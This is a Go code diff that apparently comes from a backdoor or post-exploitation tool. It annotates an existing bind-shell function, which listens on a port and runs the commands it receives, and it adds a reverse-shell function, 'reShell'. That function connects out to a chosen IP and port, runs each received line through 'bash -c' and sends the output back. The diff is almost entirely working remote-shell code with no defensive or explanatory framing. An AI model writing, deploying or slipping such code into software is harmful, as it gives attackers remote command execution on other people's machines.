@@ -8,6 +8,7 @@ import (
 	"strings"
 )
 
+// OpenShell 本地开放端口 直连shell
 func OpenShell(prot string) {
 	openPort, err := net.Listen("tcp", prot)
 	if err != nil {
@@ -29,6 +30,7 @@ func OpenShell(prot string) {
 	}
 }
 
+// handleConnection 不直接调用
 func handleConnection(conn net.Conn) {
 	defer conn.Close()
 	reader := bufio.NewReader(conn)
@@ -52,5 +54,35 @@ func handleConnection(conn net.Conn) {
 			fmt.Println("Write error:", err)
 			return
 		}
+	}
+}
+
+// reShell 反弹shell
+func reShell(ip string, port string) {
+	reIp := ip + ":" + port
+	conn, err := net.Dial("tcp", reIp)
+	if err != nil {
+		fmt.Println("Connection error:", err)
+	}
+	defer conn.Close()
+	reader := bufio.NewReader(conn)
+	for {
+		message, err := reader.ReadString('\n')
+		if err != nil {
+			fmt.Println("Read error:", err)
+			return
+		}
+		message = strings.TrimSpace(message)
+		output, err := exec.Command("bash", "-c", message).Output()
+		if err != nil {
+			fmt.Println("Command execution error:", err)
+			return
+		}
+		_, err = conn.Write(output)
+		if err != nil {
+			fmt.Println("Write error:", err)
+			return
+		}
+
 	}
 }
